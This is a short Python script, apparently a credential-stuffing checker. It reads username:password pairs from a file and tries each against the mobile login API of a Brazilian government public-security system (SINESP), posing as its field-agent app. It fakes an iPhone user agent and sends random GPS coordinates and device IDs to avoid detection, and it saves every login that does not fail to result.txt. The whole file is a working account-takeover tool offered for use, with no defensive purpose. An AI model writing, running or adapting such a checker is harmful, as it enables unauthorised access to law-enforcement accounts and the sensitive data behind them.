import requests
import random

def gerar_lat_long_instalacao():
    latitude = round(random.uniform(-90, 90), 6)
    longitude = round(random.uniform(-180, 180), 6)
    instalacao = f"{random.randint(1000, 9999)}-A035-49A3-A302-{random.randint(1000, 9999)}"
    return latitude, longitude, instalacao

arquivo = input("arquivo >  ")

with open(arquivo, 'r') as file:
    linhas = file.readlines()

url = "https://seguranca.sinesp.gov.br/sinesp-seguranca/api/sessao_autenticada/mobile"
headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X)'}

for linha in linhas:
    usuario, senha = linha.strip().split(':')
    latitude, longitude, instalacao = gerar_lat_long_instalacao()
    data = {
        "longitude": str(longitude),
        "dispositivo": "iPhone",
        "latitude": str(latitude),
        "usuario": usuario,
        "instalacao": instalacao,
        "aplicativo": "APP_AGENTE_CAMPO",
        "senha": senha
    }
    
    response = requests.post(url, headers=headers, json=data)
    
    if response.status_code == 400:
        print(f"{usuario}:{senha} - {response.json().get('mensagem')}")
    else:
        with open('result.txt', 'a') as result_file:
            result_file.write(f"{usuario}:{senha} - {response.text}\n")


print("coded by neck")
